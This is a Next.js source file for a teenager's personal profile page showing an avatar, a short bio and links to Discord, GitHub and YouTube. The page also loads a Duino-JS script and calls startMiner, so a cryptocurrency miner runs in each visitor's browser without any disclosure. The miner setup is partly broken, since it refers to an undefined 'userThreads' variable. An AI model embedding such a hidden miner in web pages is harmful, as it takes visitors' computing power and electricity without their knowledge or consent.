import {
  Button,
  Card,
  Group,
  Image,
  Text,
  Badge,
  Avatar,
  Title,
  MantineProvider,
  BackgroundImage,
  Overlay,
} from "@mantine/core";
import Head from "next/head";

export default function IndexPage() {
  return (
    <><Head>
      <script type="text/javascript" src="/static/duino-js.min.js"></script>
    </Head>
      <script>
        const username = `ipigtw`; // Put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
        const rigid = `Duino-JS`; // If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
        const threads = userThreads; // Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS#Options for more options. The default is 1.
        const miningkey = null; // Put your mining key here. If you haven't set one, replace "test" with null
        startMiner(username, rigid, threads, miningkey); // Starts the miner
      </script>
      <BackgroundImage
        src="/mygo.jpg"
        style={{ minHeight: "100vh", display: "flex", alignItems: "center" }}
      >
        <Group justify="center" style={{ width: "100%" }}>
          <Card shadow="sm" padding="lg" radius="md" withBorder opacity={0.9}>
            <Card.Section>
              <Avatar
                src="/ipig.png"
                alt="ipig"
                size={100}
                display="block"
                m="auto"
                mt={20} />
            </Card.Section>
            <Text fw={500} mt={10} style={{ textAlign: "center" }}>
              iPig
            </Text>
            <Text size="sm" c="dimmed">
              I'm a 13 years old programmer from Taiwan
            </Text>
            <Button
              color="#7289da"
              fullWidth
              mt="md"
              radius="md"
              component="a"
              href="https://discord.com/users/1113319860760494161"
            >
              My Discord
            </Button>
            <Button
              color="black"
              fullWidth
              mt="md"
              radius="md"
              component="a"
              href="https://github.com/ipigtw"
            >
              My GitHub
            </Button>
            <Button
              color="red"
              fullWidth
              mt="md"
              radius="md"
              component="a"
              href="https://youtube.com/@ipigtaiwan"
            >
              My YouTube
            </Button>
          </Card>
        </Group>
      </BackgroundImage></>
  );
}
